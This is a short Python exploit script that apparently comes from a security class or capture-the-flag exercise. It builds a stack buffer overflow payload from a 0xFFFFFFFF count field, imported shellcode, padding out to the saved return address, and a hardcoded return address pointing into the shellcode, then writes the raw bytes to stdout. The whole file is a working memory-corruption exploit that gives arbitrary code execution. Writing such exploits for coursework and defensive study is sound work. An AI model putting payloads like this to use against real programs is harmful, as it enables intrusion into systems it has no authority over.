from shellcode import shellcode
from struct import pack

RETURN_ADDRESS = 0xfffe9010  # Address for shellcode
PADDING_TO_RET = 44  # Offset: start of buf to return address

# Construct the payload
payload = b""
payload += pack("<I", 0xFFFFFFFF)  # Count: 0xFFFFFFFF
payload += shellcode
payload += b"A" * (PADDING_TO_RET - len(shellcode))  # Pad until return address
payload += pack("<I", RETURN_ADDRESS)  # new return addr

import sys
sys.stdout.buffer.write(payload)

